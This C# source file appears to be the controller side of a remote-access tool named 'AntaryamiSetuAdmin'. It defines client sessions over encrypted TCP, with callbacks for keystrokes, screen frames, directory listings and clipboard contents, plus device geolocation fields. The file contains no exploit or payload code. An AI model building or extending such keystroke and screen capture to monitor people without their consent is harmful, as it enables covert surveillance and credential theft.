using System;
using System.Drawing;
using System.Net.Sockets;
using System.Windows.Forms;

namespace AntaryamiSetuAdmin
{
    public class DeviceInfo
    {
        public string DeviceId { get; set; } = "unknown";
        public string DeviceName { get; set; } = "Scanning...";
        public string OSInfo { get; set; } = "Scanning...";
        public bool IsHttp { get; set; } = false;
        public string LastIp { get; set; } = "";
        public DateTime LastSeen { get; set; } = DateTime.MinValue;
    }

    public class ClientSession
    {
        public TcpClient? Client { get; set; }
        public NetworkStream? Stream { get; set; }
        public string EndPoint { get; set; } = "";
        public string DeviceId { get; set; } = "unknown";
        public string DeviceName { get; set; } = "Scanning...";
        public string OSInfo { get; set; } = "Scanning...";
        public string CurrentPath { get; set; } = "Scanning...";
        public bool IsActive { get; set; } = true;
        public bool IsHttp { get; set; } = false;
        
        public double Latitude { get; set; } = 0;
        public double Longitude { get; set; } = 0;
        public bool IsGeoResolved { get; set; } = false;
        
        // Event callbacks for TerminalForm routing
        public Action<byte, byte[]>? OnPacketReceived;
        public Action? OnDisconnected;
        public Action<string>? OnKeystrokesReceived;
        public Action<byte[]>? OnScreenFrameReceived;
        public Action<byte[]>? OnDirectoryListReceived;
        public Action<string>? OnClipboardReceived;

        public void SendPacket(byte type, byte[] payload)
        {
            if (Stream == null || !IsActive || IsHttp) return;
            try
            {
                byte[] encryptedPayload = EncryptionUtil.Encrypt(payload);
                byte[] packet = new byte[5 + encryptedPayload.Length];
                packet[0] = type;
                Array.Copy(BitConverter.GetBytes(encryptedPayload.Length), 0, packet, 1, 4);
                Array.Copy(encryptedPayload, 0, packet, 5, encryptedPayload.Length);
                Stream.Write(packet, 0, packet.Length);
                Stream.Flush();
            }
            catch
            {
                IsActive = false;
            }
        }
    }

    static class Program
    {
        private static Icon? _appIcon;

        public static Icon? GetAppIcon()
        {
            if (_appIcon != null) return _appIcon;
            try
            {
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream("AntaryamiSetuAdmin.logo_bg.png"))
                {
                    if (stream != null)
                    {
                        using (var bmp = new Bitmap(stream))
                        {
                            IntPtr hIcon = bmp.GetHicon();
                            _appIcon = Icon.FromHandle(hIcon);
                        }
                    }
                }
            }
            catch { }
            return _appIcon;
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            var ico = GetAppIcon();
            using (LoginForm login = new LoginForm())
            {
                if (ico != null) login.Icon = ico;
                if (login.ShowDialog() == DialogResult.OK)
                {
                    DashboardForm dash = new DashboardForm();
                    if (ico != null) dash.Icon = ico;
                    Application.Run(dash);
                }
            }
        }
    }
}
